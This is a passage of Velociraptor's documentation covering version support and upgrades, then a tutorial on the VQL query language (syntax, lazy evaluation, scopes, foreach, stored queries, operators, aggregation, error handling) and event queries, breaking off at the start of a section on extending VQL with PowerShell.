   mismatch between client and server is too great.

Typically client/server communication is stable to the point where at
least we can issue a remote upgrade for the client (i.e. run the
Admin.Client.Upgrade artifact or similar), so an upgrade path is
possible for clients.

To summarize the main takeaway from this section:

* While it is not completely unsupported, generally mixing client and
  server versions is possible and a fact of life in most
  deployments. This deployment scenario is not ideal and may not work
  completely out of the box in all cases - there may need to be some
  tweaking required (e.g. copy older artifacts or rewrite VQL using
  only older features).

* When reporting bugs, we will generally suggest upgrading clients and
  servers to the latest release. The Velociraptor team may
  de-prioritize reports for older versions of issues that may have
  already been addressed.

Ultimately, upgrading the clients is usually the recommended approach
initially.


## Server Upgrades

The Velociraptor server may be upgraded by keeping the same server
configuration file, and data store as the previous version. We
generally ensure that suitable migration code is run on upgrades on a
best effort basis. See [server upgrades documentation]({{<ref "/docs/deployment/server/#server-upgrades" >}}).

The release notes may indicate additional caveats or steps that need
to be taken during the upgrade.

We do not guarantee that all data will be accurately migrated from
older versions (especially very old versions), however we do not
generally delete the older data on migration. For example, if the
schema for certain data has changed we will attempt to migrate from
the old schema to the new schema but do not guarantee that the old
data remains accessible in the new GUI. The old data remains however
in its original raw file format.

As the configuration file evolves over time, we attempt to
transparently upgrade the configuration file when possible. We
recommend a manual review of the upgraded configuration file after an
upgrade as well. The release notes may indicate manual changes to the
configuration that may be needed.

We generally recommend upgrading one release at the time to be
conservative. Although it is possible to skip a few releases the
migration path may not be as well tested.

## Continuous integration and testing

Velociraptor has a continuous integration pipeline (CI), building
binaries at each commit point (and performing extensive
testing). These binaries are considered experimental and for testing
purposes only. You can download these binaries in order to try out a
new feature or patch a bug.

If a reported bug is deemed low priority and only affecting fewer
users, we may suggest to use the CI binaries as a temporary workaround
until the next release is available (or to help us test the bug
fix). See [Getting the latest
version](https://github.com/Velocidex/velociraptor#getting-the-latest-version)
for instructions on downloading these binaries.

You may choose to run a binary release in the master branch or (if
available) a back-ported bugfix into one of the release branches. Note
that release branches do not receive new features, but may still
receive bugfixes for critical bugs.

## Supported configurations

Velociraptor is a very flexible tool and may be configured in many
different ways to suit many different use cases. The Velociraptor team
is very interested in learning about novel use cases, but we can not
guarantee that unusual configurations work out of the box.

We generally support the configuration and deployment guides described
on the Velociraptor [documentation
site](https://docs.velociraptor.app/) only. Any deviations from these
configurations are not guaranteed to work, but you may work with us to
include them in the next release, or open a feature request on [our
issue tracker](https://github.com/Velocidex/velociraptor/issues).


## Support channels

As an open source project, the community is our greatest resource!
Many of us hang on the [discord
channel](https://docs.velociraptor.app/discord/), and are all too
happy to help.

We also have a mailing list velociraptor-discuss@googlegroups.com that
can be accessed or subscribed to on [Google
Groups](https://groups.google.com/g/velociraptor-discuss).

---END OF FILE---

======
FILE: /content/docs/vql/_index.md
======
---
title: "VQL"
date: 2021-06-11T05:55:46Z
draft: false
weight: 25
---

VQL is central to the design and functionality of Velociraptor, and a solid grasp of VQL is critical to understanding and extending Velociraptor.


## Why a new query language?

The need for a query language arose from our experience of previous
Digital Forensic and Incident Response (DFIR) frameworks. Endpoint analysis tools must be
flexible enough to adapt to new indicators of compromise (IOCs) and protect against new
threats. While it is always possible to develop new capability in
code, it's not always easy or quick to deploy a new version.

A query language can accelerate the time it takes to discover an IOC, design a rule to detect it, and then deploy the detection at scale across
a large number of hosts. Using VQL, a DFIR investigator can
learn of a new type of indicator, write relevant VQL queries,
package them in an artifact, and hunt for the artifact across the
entire deployment in a matter of minutes.

Additionally, VQL artifacts can be shared with the community and
facilitate a DFIR-specific knowledge exchange of
indicators and detection techniques.


{{% children %}}

---END OF FILE---

======
FILE: /content/docs/vql/fundamentals/_index.md
======
---
title: "VQL Fundamentals"
date: 2025-01-24
draft: false
weight: 10
---

{{% notice tip "Running VQL queries in Notebooks" %}}

When learning VQL, we recommend practicing in an environment where you can
easily debug, iterate, and interactively test each query.

You can read more about notebooks [here]({{< ref "/docs/notebooks/" >}}).
For the purposes of this documentation, we will assume you've created a notebook
and are typing VQL into the cell.

{{% /notice %}}

## Basic Syntax

VQL's syntax is heavily inspired by SQL. It uses the same basic
`SELECT .. FROM .. WHERE` sentence structure, but does not include the
more complex SQL syntax, such as `JOIN` or `HAVING`. In VQL, similar
functionality is provided through plugins, which keeps the syntax
simple and concise.

### Whitespace

VQL does not place any restrictions on the use of whitespace in the
query body. We generally prefer queries that are well indented because
they are more readable and look better but this is not a
requirement. Unlike SQL, VQL does not require or allow a semicolon `;`
at the end of statements.

The following two queries are equivalent

```vql
-- This query is all on the same line - not very readable but valid.
LET X = SELECT * FROM info() SELECT * FROM X

-- We prefer well indented queries but VQL does not mind.
LET X= SELECT * FROM info()
SELECT * FROM X
```

Let's consider the basic syntax of a VQL query.

![Basic syntax](vql_structure.png)

The query starts with a SELECT keyword, followed by a list of `Column
Selectors` then the `FROM` keyword and a `VQL Plugin` potentially
taking arguments. Finally we have a `WHERE` keyword followed by a
filter expression.

### Plugins

While VQL syntax is similar to SQL, SQL was designed to work on static
tables in a database. In VQL, the data sources are not actually static
tables on disk - they are provided by code that runs to generate
rows. `VQL Plugins` produce rows and are positioned after the
`FROM` clause.

Like all code, VQL plugins use parameters to customize and control
their operations. VQL Syntax requires all arguments to be provided by
name (these are called keyword arguments). Depending on the specific
plugins, some arguments are required while some are optional.

{{% notice tip "Using the GUI suggestions" %}}

You can type `?` in the Notebook interface to view a
list of possible completions for a keyword. Completions are context sensitive. For example, since plugins must follow the `FROM` keyword, any suggestions
after the `FROM` keyword will be for VQL plugins. Typing `?` inside
a plugin arguments list shows the possible arguments, their
type, and if they are required or optional.

![VQL Plugin Completions](completion.png)

![VQL Plugin arguments Completions](completion2.png)

{{% /notice %}}

### Life of a query

In order to understand how VQL works, let's follow a single row through the query.

![Life of a query](life_of_a_query.png)

1. Velociraptor's VQL engine will call the plugin and pass
   any relevant arguments to it. The plugin will then generate one or
   more rows and send a row at a time into the query for further
   processing.

2. The column expression in the query receives the
   row. However, instead of evaluating the column expression
   immediately, VQL wraps the column expression in a `Lazy
   Evaluator`. Lazy evaluators allow the actual evaluation of the
   column expression to be delayed until a later time.

3. Next, VQL takes the lazy evaluator and uses them to evaluate the
   filter condition, which will determine if the row is to be
   eliminated or passed on.

4. In this example, the filter condition (`X=1`) must evaluate the
   value of X and therefore will trigger the Lazy Evaluator.

5. Assuming X is indeed 1, the filter will return TRUE and the row
   will be emitted from the query.

### Lazy Evaluation

In the previous example, the VQL engine goes through signficant effort to postpone the evaluation as much as
possible. Delaying an evaluation is a recurring theme in VQL and it saves Velociraptor from performing unnecessary work, like evaluating a
column value if the entire row will be filtered out.

Understanding lazy evaluation is critical to writing efficient VQL
queries. Let's examine how this work using a series of
experiments. For these experiments we will use the `log()` VQL
function, which simply produces a log message when evaluated.

```sql
-- Case 1: One row and one log message
SELECT OS, log(message="I Ran!") AS Log
FROM info()

-- Case 2: No rows and no log messages
SELECT OS, log(message="I Ran!") AS Log
FROM info()
WHERE OS = "Unknown"

-- Case 3: Log message but no rows
SELECT OS, log(message="I Ran!") AS Log
FROM info()
WHERE Log AND OS = "Unknown"

-- Case 4: No rows and no log messages
SELECT OS, log(message="I Ran!") AS Log
FROM info()
WHERE OS = "Unknown" AND Log
```

In Case 1, a single row will be emitted by the query and the associated log function will be evaluated, producing a log message.

Case 2 adds a condition which should eliminate the row. **Because the
row is eliminated VQL can skip evaluation of the log()
function.** No log message will be produced.

Cases 3 and 4 illustrate VQL's evaluation order of `AND` terms - from
left to right with an early exit.

We can use this property to control when expensive functions are
evaluated e.g. `hash()` or `upload()`.

### What is a Scope?

Scope is a concept common in many languages, and it is also central in
VQL.  A scope is a bag of names that is used to resolve symbols,
functions and plugins in the query.

For example, consider the query

```sql
SELECT OS FROM info()
```

VQL sees “info” as a plugin and looks in the scope to get the real
implementation of the plugin.

Scopes can be nested, which means that in different parts of the query a
new child scope is used to evaluate the query. The child scope is
constructed by layering a new set of names over the top of the
previous set. When VQL tries to resolve a name, it looks up the scope
in reverse order going from layer to layer until the symbol is
resolved.

Take the following query for example,

![Scope lookup](scope.png)

VQL evaluates the `info()` plugin, which emits a single row. Then VQL
creates a child scope, with the row at the bottom level. When VQL tries
to resolve the symbol `OS` from the column expression, it examines the
scope stack in reverse, checking if the symbol `OS` exists in the
lower layer. If not, VQL checks the next layer, and so on.

{{% notice warning "Masking variables in the scope" %}}

Columns produced by a plugin are added to the child scope and
therefore **mask** the same symbol name from parent scopes. This can
sometimes unintentionally hide variables of the same name which are
defined at a parent scope. If you find this happens to your query you
can rename earlier symbols using the `AS` keyword to avoid this
problem.  For example:

```sql
SELECT Pid, Name, {
   SELECT Name FROM pslist(pid=Ppid)
} AS ParentName
FROM pslist()
```

In this query, the symbol `Name` in the outer query will be resolved
from the rows emitted by `pslist()` but the second `Name` will be
resolved from the row emitted by `pslist(pid=Ppid)` - or in other
words, the parent's name.

{{% /notice %}}

### String constants

Strings denoted by `"` or `'` can escape special characters using the
`\`. For example, `"\n"` means a new line. This is useful but it
also means that backslashes need to be escaped. This is sometimes
inconvenient, especially when dealing with Windows paths (that
contains a lot of backslashes).

Therefore, Velociraptor also offers a multi-line raw string which is
denoted by `'''` (three single quotes). Within this type of string no
escaping is possible, and the all characters are treated literally -
including new lines. You can use `'''` to denote multi line strings.

### Identifiers with spaces

In VQL an `Identifier` is the name of a column, member of a dict or a
keyword name. Sometimes identifiers contain special characters such as
space or `.` which make it difficult to specify them without having
VQL get confused by these extra characters.

In this case it is possible to enclose the identifier name with back
ticks (`` ` ``).

In the following example, the query specifies keywords with spaces to
the `dict()` plugin in order to create a dict with keys containing spaces.

The query then continues to extract the value from this key by
enclosing the name of the key using backticks.

```vql
LET X = SELECT dict(`A key with spaces`="String value") AS Dict
FROM scope()

SELECT Dict, Dict.`A key with spaces` FROM X
```

### Subqueries

VQL Subqueries can be specified as a column expression or as an
arguments. Subqueries are delimited by `{` and `}`. Subqueries are
also lazily evaluated, and will only be evaluated when necessary.

The following example demonstrates subqueries inside plugin args. The
`if()` plugin will evaluate the `then` or the `else` query depending
on the `condition` value (in this example when X has the value 1).

```vql
SELECT * FROM if(condition=X=1,
then={
  SELECT * FROM ...
},
else={
  SELECT * FROM ...
})
```

### Subqueries as columns

You can use a subquery as a column which will cause it to be evaluated
for each row (in this way it is similar to the `foreach()` plugin).

Since subqueries are always an array of dictionaries, the output if
often difficult to read when the subquery returns many rows or
columns. As a special case, VQL will simplify subqueries:

1. If the subquery returns one row and has several columns, VQL will
   put a single dictionary of data in the column.
2. If the subquery returns one row and a single column, the value is
   expanded into the cell.

These heuristics are helpful when constructing subqueries to enrich
columns. If you wish to preserve the array of dicts you can use a VQL
function instead.

Here is an example to demonstrate:
```vql
LET Foo =  SELECT "Hello" AS Greeting FROM scope()

SELECT { SELECT "Hello" AS Greeting FROM scope() } AS X,
       { SELECT "Hello" AS Greeting, "Goodbye" AS Farewell FROM scope() } AS Y,
       Foo AS Z
FROM scope()
```

In the above query - X is a subquery with a single row and a single
column, therefore VQL will simplify the column X to contain `"Hello"`
The second query contains two columns so VQL will simplify it into a
dict.

Finally to get the full unsimplified content, a VQL stored query can
be used. This will result in an array of one dict, containing a single
column `Greeting` with value of `Hello`


### Arrays

An array may be defined either by `(` and `)` or `[` and `]`. Since it
can be confusing to tell regular parenthesis from an array with a
single element, VQL also allows a trailing comma to indicate a single
element array. For example `(1, )` means an array with one member,
whereas `(1)` means a single value of 1.

### The scope() plugin

VQL is strict about the syntax of a VQL statement. Each statement must
have a plugin specified, however sometimes we dont really want to
select from any plugin at all.

The default noop plugin is called `scope()` and simply returns the
current scope as a single row. If you even need to write a query but
do not want to actually run a plugin, use `scope()` as a noop
plugin. For example

```sql
-- Returns one row with Value=4
SELECT 2 + 2 AS Value
FROM scope()
```

## The Foreach plugin

VQL is modeled on basic SQL since SQL is a familiar language for new
users to pick up. However, SQL quickly becomes more complex with very
subtle syntax that only experienced SQL users use regularly. One of
the more complex aspects of SQL is the `JOIN` operator which typically
comes in multiple flavors with subtle differences (INNER JOIN, OUTER
JOIN, CROSS JOIN etc).

While these make sense for SQL since they affect the way indexes are
used in the query, VQL does not have table indexes, nor does it have
any tables. Therefore the `JOIN` operator is meaningless for
Velociraptor. To keep VQL simple and accessible, we specifically did
not implement a `JOIN` operator. For a more detailed discussion of the
`JOIN` operator see [emulating join in VQL]({{% relref "../join" %}})

Instead of a `JOIN` operator, VQL has the `foreach()` plugin, which is
probably the most commonly used plugin in VQL queries. The `foreach()`
plugin takes two arguments:

1. The `row` parameter is a subquery that provides rows

2. The `query` parameter is a subquery that will be evaluated on a
   subscope containing each row that is emitted by the `row` argument.

Consider the following query:

```sql
SELECT * FROM foreach(
    row={
        SELECT Exe FROM pslist(pid=getpid())
    },
    query={
        SELECT ModTime, Size, FullPath FROM stat(filename=Exe)
    })
```

Note how `Exe` is resolved from the produced row since the query is
evaluated within the nested scope.

Foreach is useful when we want to run a query on the output of another
query.

### Foreach on steroids

Normally foreach iterates over each row one at a time.  The
`foreach()` plugin also takes the workers parameter. If this is larger
than 1, `foreach()` will use multiple threads and evaluate the `query`
query in each worker thread. This allows the query to evaluate values in parallel.

For example, the following query retrieves all the
files in the System32 directory and calculates their hash.

```sql
SELECT FullPath, hash(path=FullPath)
FROM glob(globs="C:/Windows/system32/*")
WHERE NOT IsDir
```

As each row is emitted from the `glob()` plugin with a filename of a
file, the `hash()` function is evaluated and the hash is
calculated.

However this is linear, since each hash is calculated before the next
hash is started - hence only one hash is calculated at once.

This example is very suitable for parallelization because globbing for
all files is quite fast, but hashing the
files can be slow. If we delegate the hashing to multiple threads, we
can make more effective use of the CPU.

```sql
SELECT * FROM foreach(
row={
   SELECT FullPath
   FROM glob(globs="C:/Windows/system32/*")
   WHERE NOT IsDir
}, query={
   SELECT FullPath, hash(path=FullPath)
   FROM scope()
}, worker=10)

```

### Foreach and deconstructing a dict

Deconstructing a dict means to take that dict and create a column for
each field of that dict. Consider the following query:

```sql
LET Lines = '''Foo Bar
Hello World
Hi There
'''

LET all_lines = SELECT grok(grok="%{NOTSPACE:First} %{NOTSPACE:Second}", data=Line) AS Parsed
FROM parse_lines(accessor="data", filename=Lines)

SELECT * FROM foreach(row=all_lines, column="Parsed")
```

This query reads some lines (for example log lines) and applies a grok
expression to parse each line. The grok function will produce a dict
after parsing the line with fields determined by the grok expression.

The `all_lines` query will have one column called "Parsed" containing
a dict with two fields (First and Second). Using the `column`
parameter to the foreach() plugin, foreach will use the value in that
column as a row, deconstructing the dict into a table containing the
`First` and `Second` column.

## LET expressions

We know that subqueries can be used in various parts of
the query, such as in a column specifier or as an argument to a
plugin. While subqueries are convenient, they can become unwieldy when
nested too deeply. VQL offers an alternative to subqueries called
`Stored Queries`.

A stored query is a lazy evaluator of a query that we can store in
the scope.  Wherever the stored query is used it will be evaluated on
demand. Consider the example below, where for each process, we
evaluate the `stat()` plugin on the executable to check the
modification time of the executable file.

```sql
LET myprocess = SELECT Exe FROM pslist()

LET mystat = SELECT ModTime, Size, FullPath
        FROM stat(filename=Exe)

SELECT * FROM foreach(row=myprocess, query=mystat)
```

{{% notice note %}}

A Stored Query is simply a query that is stored into a variable. It is
not actually evaluated at the point of definition. At the point where
the query is referred, that is where evaluation occurs. The scope at
which the query is evaluated is derived from the point of reference.

For example in the query above, `mystat` simply stores the query
itself. Velociraptor will then re-evaluate the `mystat` query for each
row given by `myprocess` as part of the `foreach()` plugin operation.

{{% /notice %}}

### LET expressions are lazy

We have previously seen VQL goes out of its way to do as little work
as possible.

Consider the following query

```sql
LET myhashes = SELECT FullPath, hash(path=FullPath)
FROM glob(globs="C:/Windows/system32/*")

SELECT * FROM myhashes
LIMIT 5
```

The `myhashes` stored query hashes all files in System32 (many
thousands of files). However, this query is used in a second query
with a `LIMIT` clause.

When the query emits 5 rows in total, the entire query is cancelled
(since we do not need any more data) which in turn aborts the
`myhashes` query. Therefore, VQL is able to exit early from any query
without having to wait for the query to complete.

This is possible because VQL queries are **asynchronous** - we do
**not** calculate the entire result set of `myhashes` **before** using
`myhashes` in another query, we simply pass the query itself and
forward each row as needed.

### Materialized LET expressions

A stored query does not in itself evaluate the
query. Instead the query will be
evaluated whenever it is referenced.

Sometimes this is not what we want to do. For example consider a query
which takes a few seconds to run, but its output is not expected to
change quickly. In that case, we actually want to cache the results of
the query in memory and simply access it as an array.

Expanding a query into an array in memory is termed `Materializing`
the query.

For example, consider the following query that lists all sockets on
the machine, and attempts to resolve the process ID to a process name
using the `pslist()` plugin.

```sql
LET process_lookup = SELECT Pid AS ProcessPid, Name FROM pslist()

SELECT Laddr, Status, Pid, {
   SELECT Name FROM process_lookup
   WHERE Pid = ProcessPid
} AS ProcessName
FROM netstat()
```

This query will be very slow because the `process_lookup` stored query
will be re-evaluated for each row returned from netstat (that is, for each
socket).

The process listing will not likely change during the few seconds it takes the query to run.
It would be more efficient to have the process listing cached in memory
for the entire length of the query.

We recommend that you `Materialize` the query:

```sql
LET process_lookup <= SELECT Pid AS ProcessPid, Name FROM pslist()

SELECT Laddr, Status, Pid, {
   SELECT Name FROM process_lookup
   WHERE Pid = ProcessPid
} AS ProcessName
FROM netstat()
```

The difference between this query and the previous one is that
the `LET` clause uses `<=` instead of `=`. The `<=` is the materialize
operator. It tells VQL to expand the query in place into an array
which is then assigned to the variable `process_lookup`.

Subsequent accesses to `process_lookup` simply access an in-memory
array of pid and name for all processes and **do not** need to run
`pslist()` again.

## Local functions

`LET` expressions may store queries into a variable,
and have the queries evaluated in a subscope at the point of use.

A `LET` expression can also declare explicit passing of
variables.

Consider the following example which is identical to the example
above:

```sql
LET myprocess = SELECT Exe FROM pslist()

LET mystat(Exe) = SELECT ModTime, Size, FullPath
        FROM stat(filename=Exe)

SELECT * FROM foreach(row=myprocess, query={
  SELECT * FROM mystat(Exe=Exe)
})
```

This time `mystat` is declares as a `VQL Local Plugin` that
takes arguments. Therefore we now pass it an parameter explicitly and
it behaves as a plugin.

Similarly we can define a `VQL Local Function`.

```sql
LET MyFunc(X) = X + 5

-- Return 11
SELECT MyFunc(X=6) FROM scope()
```

{{% notice tip "Differences between a VQL plugin and VQL function" %}}

Remember the difference between a VQL plugin and a VQL function is
that a plugin returns multiple rows and therefore needs to appear
between the FROM and WHERE clauses. A function simply takes several
values and transforms them into a single value.

{{% /notice %}}

## VQL Operators

In VQL an operator represents an operation to be taken on
operands. Unlike SQL, VQL keeps the number of operators down,
preferring to use VQL functions over introducing new operators.

The following operators are available. Most operators apply to two
operands, one on the left and one on the right (so in the expression
`1 + 2` we say that `1` is the Left Hand Side (`LHS`), `2` is the Right
Hand Side (`RHS`) and `+` is the operator.

|Operator|Meaning|
|--------|-------|
|`+ - * /`| These are the usual arithmetic operators |
|`=~` | This is the regex operator, reads like "matches". For example `X =~ "Windows"` will return `TRUE` if X matches the regex "Windows"|
|`!= = < <= > >=` | The usual comparison operators. |
|`in` | The membership operator. Returns TRUE if the LHS is present in the RHS. Note that `in` is an exact case sensitive match|
|`.`| The `.` operator is called the Associative operator. It dereferences a field from the LHS named by the RHS. For example `X.Y` extracts the field `Y` from the dict `X`|

### Protocols

When VQL encounters an operator it needs to decide how to actually
evaluate the operator. This depends on what types the LHS and RHS
operands actually are. The way in which operators interact with the
types of operands is called a `protocol`.

Generally VQL does the expected thing but it is valuable to understand
which protocol will be chosen in specific cases.

### Example - Regex operator

For example consider the following query

```vql
LET MyArray = ("X", "XY", "Y")
LET MyValue = "X"
LET MyInteger = 5

SELECT MyArray =~ "X", MyValue =~ "X", MyInteger =~ "5"
FROM scope()
```

In the first case the regex operator is applied to an array so the
expression is true if **any** member of the array matches the regular
expression.

The second case applied the regex to a string, so it is true if the
string matches.

Finally in the last case, the regex is applied to an integer. It makes
no sense to apply a regular expression to an integer and so VQL
returns FALSE.

### Example - Associative operator applied on a stored query

The Associative operator is denoted by `.` and accesses a field from
an object or dict. One of the interesting protocols of the `.`
operator is when it is applied to a query or a list.

In the following example, I define a stored query that calls the
`Generic.Utils.FetchBinary` artifact (This artifact fetches the named
binary):

```vql
LET binary = SELECT FullPath
  FROM Artifact.Generic.Utils.FetchBinary(ToolName="ToolName")
```

Although a query defined via the `LET` keyword does not actually run
the query immediately (it is a lazy operator), we can think of the
variable `binary` as containing an array of dictionaries
(e.g. `[{"FullPath": "C:\Windows\Temp\binary.exe"}]`).

If we now apply the associative operator `.` to the variable binary,
the operator will convert the array into another array, where each
member is extracted for example `binary.FullPath` is
`["C:\Windows\Temp\binary.exe"]`. To access the name of the binary we
can then index the first element from the array.


```vql
SELECT * FROM execve(argv=[binary.FullPath[0], "-flag"])
```

{{% notice warning "Expanding queries using the associative operator" %}}

While using the `.` operator is useful to apply to a stored query, care
must be taken that the query is not too large. In VQL stored queries
are lazy and do not actually execute until needed because they can
generate thousands of rows! The `.` operator expands the query into an
array and may exhaust memory doing so.

The following query may be disastrous:

```vql
LET MFT = SELECT * FROM Artifact.Windows.NTFS.MFT()

SELECT MFT.FullPath FROM scope()
```

The `Windows.NTFS.MFT` artifact typically generates millions of rows,
and `MFT.FullPath` will expand them all into memory!

{{% /notice %}}

## VQL control structures

Let's summarizes some of the more frequent VQL control structures.

We already met with the `foreach()` plugin before. The `row` parameter
can also receive any iterable type (like an array).

### Looping over rows

VQL does not have a JOIN operator - we use the foreach plugin to
iterate over the results of one query and apply a second query on it.

```sql
SELECT * FROM foreach(
    row={ <sub query goes here> },
    query={ <sub query goes here >})
```

### Looping over arrays

Sometimes arrays are present in column data. We can iterate over these
using the foreach plugin.

```sql
SELECT * FROM foreach(
    row=<An iterable type>,
    query={ <sub query goes here >})
```

If row is an array, the value will be assigned to `_value` as a special placeholder.


### Conditional: if plugin and function

The `if()` plugin and function allows branching in VQL.

```sql
SELECT * FROM if(
    condition=<sub query or value>,
    then={ <sub query goes here >},
    else={ <sub query goes here >})
```

If the condition is a query it is true if it returns any rows. Next, we'll
evaluate the `then` subquery or the `else` subquery. Note that as usual,
VQL is lazy and will not evaluate the unused query or expression.

### Conditional: switch plugin

The `switch()` plugin and function allows multiple branching in VQL.

```sql
SELECT * FROM switch(
    a={ <sub query >},
    b={ <sub query >},
    c={ <sub query >})
```

Evaluate all subqueries in order and when any of them returns any rows
we stop evaluation the rest of the queries.


As usual VQL is lazy - this means that branches that are not taken are
essentially free!

### Conditional: chain plugin

The `chain()` plugin allows multiple queries to be combined.

```sql
SELECT * FROM chain(
    a={ <sub query >},
    b={ <sub query >},
    c={ <sub query >})
```

Evaluate all subqueries in order and append all the rows together.

## Group by clause

A common need in VQL is to use the `GROUP BY` clause to stack all rows
which have the same value, but what exactly does the `GROUP BY` clause
do?

As the name suggests, `GROUP BY` splits all the rows into groups
called bins where each bin has the same value of as the target
expression.

![Group By](groupby.png)

Consider the query in the example above, the `GROUP BY` clause
specifies that rows will be grouped where each bin has the same value
of the `X` column. Using the same table, we can see the first group
having `X=1` contains 2 rows, while the second group having `X=2`
contains only a single row.

The `GROUP BY` query will therefore return two rows (one for each
bin). Each row will contain a single value for the `X` value and one
of the `Y` values.

{{% notice warning "Selecting columns with GROUP BY" %}}

As the above diagram illustrates, it only makes sense in general to
select the same column as is being grouped. This is because other
columns may contain any number of values, but only a single one of
these values will be returned.

In the above example, selecting the `Y` column is not deterministic
because the first bin contains several values for `Y`.

Be careful not to rely on the order of rows in each bin.

{{% /notice %}}

### Aggregate functions

Aggregate VQL functions are designed to work with the `GROUP BY`
clause to operate on all the rows in each bin separately.

Aggregate functions keep state between evaluations. For example
consider the `count()` function. Each time count() is evaluated, it
increments a number in its own state.

Aggregate function State is kept in an `Aggregate Context` - a
separate context for each `GROUP BY` bin. Therefore, the following
query will produce a count of all the rows in each bin (because each
bin has a separate state).

```sql
SELECT X, count() AS Count
FROM …
GROUP BY X
```

Aggregate functions are used to calculate values that consider
multiple rows.

Some aggregate functions:

* `count()` counts the total number of rows in each bin.
* `sum()` adds up a value for an expression in each bin.
* `enumerate()` collect all the values in each bin into an in-memory array.
* `rate()` calculates a rate (first order derivative) between each
  invocation and its previous one.

These can be seen in the query below.

![Aggregate functions](image70.png)

### VQL Lambda functions

In various places it is possible to specify a VQL lambda
function. These functions a simple VQL expressions which can be used
as filters, or simple callbacks in some plugins. The format is simple:

```
x=>x.Field + 2
```

Represents a simple function with a single parameter `x`. When the
lambda function is evaluated, the caller will pass the value as `x`
and receive the result of the function.

Usually lambda functions are specified as strings, and will be
interpreted at run time. For example the `eval()` function allows a
lambda to be directly evaluated (with `x` being the current scope in
that case).


```vql
SELECT eval(func="x=>1+1") AS Two FROM scope()
```

The scope that is visited at the place where the lambda is evaluated
will be passed to the lambda function - this allows the lambda to
access previously defined helper functions.

```vql
LET AddTwo(x) = x + 2

SELECT eval(func="x=>AddTwo(x=1)") AS Three FROM scope()
```

### VQL Error handling

VQL queries may encounter errors during their execution. For example,
we might try to open a file, but fail due to insufficient permissions.

It is especially not desirable to have VQL stop execution completely
and abort when an error occurs. Usually we want the query to continue
and produce as much data as possible. However, we do want to
know that some things potentially went wrong.

Therefore VQL functions typically return `NULL` in the case of an
error, and log the error in the `Query Logs`. These logs are visible
in a number of places:

1. When collecting an artifact from a client, the query logs are
   visible in the `Logs` tab.
2. In a notebook cell the query logs are visible by clicking the
   `Logs` button at the bottom of the cell.
3. With the API the query logs are returned in a separate response
   field.

When writing a VQL query, another aspect to think about is: what do we
define as an error? For example if we write a VQL query to collect a
bunch of files, but one of these files is unreadable - do we consider
the query has failed?  Should we just stop?

It really depends on a case by case basis.

Generally when collecting an artifact, a number of error conditions
might occur and some query logs will be produced. But the collection
is not automatically marked as an `Error` unless one of the following
conditions is met:

1. Any logs are emitted at the `ERROR` level (using the `log()`
   function with `level='ERROR'`).
2. Any log messages match the error patterns defined in
   [Frontend.collection_error_regex](https://docs.velociraptor.app/docs/deployment/references/#Frontend.collection_error_regex). By
   default this includes `Symbol not found` which usually indicates a
   mistake or typo with the VQL query itself.
3. Errors produced by the client itself (e.g. the query canceled or timed out)

When a collection indicates an error all it means is that something
unexpected happened and a user needs to take a closer look. The
collection may still contain useful data - it is a judgment call.

Therefore when writing your own VQL think if an error is actually
something we need to alert the user about (i.e. there is no further
value in the collection) or can we just log the error and move on.

Conversely as a Velociraptor user, when a collection is completed
without an error it does not necessarily mean that everything worked
perfectly - there may be some messages in the query logs that alert to
some errors encountered. You should always take a quick look at the
error logs to see if there is anything of concern.


{{% notice warning "Temporary or permanent errors" %}}

Note that an error may be temporary (e.g. the artifact collection
timed out), or permanent (e.g. an error within the VQL itself, file
not found etc).

It is not a good idea to automatically retry a collection unless you
are sure the error is temporary - if the error is more permanent the
same thing will happen again. It is always worth checking the query
logs to make sure there is any point in retrying the collection.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/vql/events/_index.md
======
---
title: "Event Queries"
date: 2021-06-12T20:57:18Z
draft: false
weight: 20
---

Normally a VQL query returns a result set and then terminates. For
example, consider the `glob()` plugin which searches the filesystem
for files matching a pattern. While it may take a few minutes to fully
traverse the entire filesystem, as soon as a matching file is found,
the row is emitted from the plugin asynchronously.

VQL queries are always asynchronous which means that as soon as
results are available, they are emitted into the query, and can
potentially be relayed back to the server - even if the plugin takes a
very long time to run.

Consider now a VQL plugin that takes a long time to complete, perhaps
even days. As soon as a result is available, a row will be emitted and
will be relayed to the server. Now what if the plugin emits a row
based on an event occurring?

When the event occurs, the plugin will asynchronously emit a row
describing the event, and go back to monitoring for the event
again. This type of plugin is called an `Event Plugin` because it
never terminates - instead it emits a row when an event occur. The
entire VQL query is blocked waiting for the event.

A Query that is waiting on an event (i.e. it is selecting from an
event plugin) is called an `Event Query`. Event queries do not
terminate on their own - they simply return partial results until
cancelled.

![Event Query](eventquery.png)

The diagram above illustrates how partial results are send to the
server. As events occur at random times on the endpoint, the event
plugin will emit rows into the query at random times. In order to
minimize frequent communicating with the server, the client will batch
rows into partial results sets which will be forwarded periodically to
the server.

## Example

You can get the feel of event queries by typing the following query
into a notebook

```sql
SELECT Unix FROM clock()
```

The `clock()` plugin simply emits one row per second. The GUI will be
waiting for the query to complete, showing partial results as it goes
along. Of course the query will not complete by itself, only when it
hits the notebook's 10 Minute timeout or the user clicks the `Stop`
<i class="fas fa-stop"></i> button.

![The Clock plugin generates a row every second by default](image65.png)

To learn more about how Velociraptor uses event queries to monitor
events on endpoints, see [Client Monitoring]({{< ref
"/docs/clients/monitoring/" >}})

---END OF FILE---

======
FILE: /content/docs/vql/extending_vql/_index.md
======
---
title: "Extending VQL"
date: 2021-06-27T04:29:26Z
draft: false
weight: 40
---

VQL is really a glue language - we rely on VQL plugins and functions
to do all the heavy lifting.  VQL was never designed to be an all
powerful language - users will hit the limits of what is possible in
VQL pretty quickly.

To take full advantage of the power of VQL, we need to be able to
easily extend its functionality. This section illustrates how VQL can
be extended by including powershell scripts and external binaries.

For the ultimate level of control and automation, the Velociraptor API
can be used to interface directly to the Velociraptor server utilizing
many supported languages (like Java, C++, C#, Python).

## Extending VQL - Artifacts

The most obvious way for extending VQL is simply writing additional
artifacts. We have seen this done extensively in previous pages: Once
an artifact is added to Velociraptor, other artifacts can easily reuse
it by simply calling it.

Artifacts serve to encapsulate VQL queries and allow us to build more
complex content, but ultimately we are still limited with the basic
capabilities of the VQL engine. Adding more artifacts can not extend
the basic functionality provided by the built in VQL plugins and
functions.

### Extending artifacts - PowerShell

Powershell is a powerful systems automation language mainly used on
Windows systems where is comes built in and almost always available.

Many complex software products contain powershell modules around
automation and system administration. It does not make sense for
Velociraptor to directly support complex software packages such as
Office365, Azure which already come with extensive powershell support.

But it is critical to be able to recover forensically relevant data
from these package. Therefore it makes sense to wrap powershell
scripts in VQL artifacts.

In the following we see how to wrap a simple powershell snippet in
VQL. The process for wrapping other powershell snippets is very
similar.

